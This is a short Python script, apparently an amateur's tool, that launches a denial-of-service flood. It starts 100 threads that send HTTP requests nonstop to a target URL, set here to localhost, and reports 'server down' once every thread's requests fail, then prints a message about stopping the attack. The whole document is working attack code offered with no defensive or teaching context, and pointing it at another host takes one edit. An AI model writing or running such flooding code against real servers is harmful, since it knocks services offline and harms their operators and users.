import urllib.request

import time
import threading

is_it_down=[]

stop=False
tageget="http://127.0.0.1"
class myThread (threading.Thread):
   def __init__(self, threadID,):
      threading.Thread.__init__(self)
      self.threadID = threadID
   def run(self):
     while stop ==False:
         try:
            contents = urllib.request.urlopen(tageget,timeout=5).read()
            #print(contents)
         except:
            is_it_down[self.threadID]=True
            #print("can get data from server might be dead")

# Create new threads
therd_list=[]
for q in range(100):
    therd_list.append(myThread(q))
    is_it_down.append(False)

for q in therd_list:
    q.start()




while stop==False:
    temp=True
    for q in is_it_down:
        if q==False:
            temp=False
    if temp==True:
        print("server down")
        time.sleep(5)
        stop=True

print("stoping attac ")
exit()
